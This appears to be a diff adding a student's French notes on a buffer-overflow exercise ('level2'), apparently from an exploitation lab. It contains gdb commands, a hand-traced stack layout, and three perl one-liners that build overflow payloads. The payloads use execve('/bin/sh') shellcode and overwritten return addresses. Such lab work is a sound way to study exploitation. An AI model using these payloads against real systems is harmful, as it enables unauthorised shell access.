@@ -1,0 +1,58 @@
+gdb level2
+
+b *0x080484d4
+disas p
+
+i r
+
+Apres le <+3> :
+
+
+
+ebp => 0xbffff6e8 (adresse haute)
+
+
+0xbffff69c -> 1 (ebp - 0x4c [76 octets])
+
+esp => 0xbffff680 (adresse basse)
+
+Entre esp et ebp : 104 octets
+
+Apres <+19>
+
+esp pointe vers une adresse plus proche de ebp
+
+
+Pile (<+22>): 
+
+ebp => 0xbffff6e8 (adresse haute)
+
+
+esp => 0xbffff69c -> 1 (ebp - 0x4c [76 octets])
+
+<+30> on va mettre l'adresse d'eip dans eax (ebp + 4)
+et on va copier cette valeur a ebp-0xc soit (0xbffff6dc)
+
+
+ebp => 0xbffff6e8 (adresse haute)
+
+ebp-12(0xc) => adresse eip (0x80484f5)
+
+esp => 0xbffff69c -> 1 (ebp - 0x4c [76 octets])
+
+ensuite on met valeur eip dans eax
+
+
+
+dans le main a ebp (0xbffff6f8) + 4 on a :
+0xbffff6fc: 0xb7e454d3
+
+
+
+echo `perl -e 'print "B"x49 . "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" . "\xe8\xf6\xff\xbf" ."\x4a\x85\x04\x08" . "B"x92 . "\x9c\xf6\xff\xbf"'` > inject4
+
+
+perl -e 'print "\x90"x49 . "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" . "\xe8\xf6\xff\xbf" ."\x4a\x85\x04\x08" . "\x90"x12 . "\x9c\xf6\xff\xbf"' > inject2
+
+
+perl -e 'print "A"x50 . "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" . "\xd8\xf6\xff\xbf" . "\x4a\x85\x04\x08" . "AAAA" . "BBBB" . "CCCC" . "\xd3\x54\xe4\xb7"' > /tmp/injectx
